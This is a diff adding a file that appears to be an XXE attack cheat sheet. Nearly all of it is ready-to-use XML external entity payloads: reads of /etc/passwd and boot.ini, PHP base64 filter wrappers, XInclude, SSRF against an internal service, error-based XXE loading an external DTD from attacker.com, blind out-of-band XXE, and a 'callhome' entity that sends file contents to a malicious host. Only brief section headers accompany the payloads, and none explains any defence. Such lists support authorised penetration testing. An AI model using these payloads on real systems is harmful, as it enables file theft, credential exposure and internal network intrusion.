@@ -1,0 +1,90 @@
+Classic -------------------------
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///etc/passwd">
+]>
+<data>&file;</data>
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+  
+  
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+  
+  PHP Wrapper inside XXE ---------------------
+  
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue du CTF</adress>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
+]>
+<foo>&xxe;</foo>
+
+XInclude attacks -------------------------------------
+
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+Exploiting XXE to perform SSRF attacks ----------------------------
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
+]>
+<foo>&xxe;</foo>
+
+Error Based XXE ----------------------
+
+Payload to trigger the XXE ---
+
+<?xml version="1.0" ?>
+<!DOCTYPE message [
+    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
+    %ext;
+]>
+<message></message>
+
+Contents of ext.dtd -------
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+Blind XXE
+
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://UNIQUE_ID_FOR_BURP_COLLABORATOR.burpcollaborator.net/x"> %ext;
+]>
+<r></r>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY % xxe SYSTEM "file:///etc/passwd" >
+<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+]
+>
+<foo>&callhome;</foo>
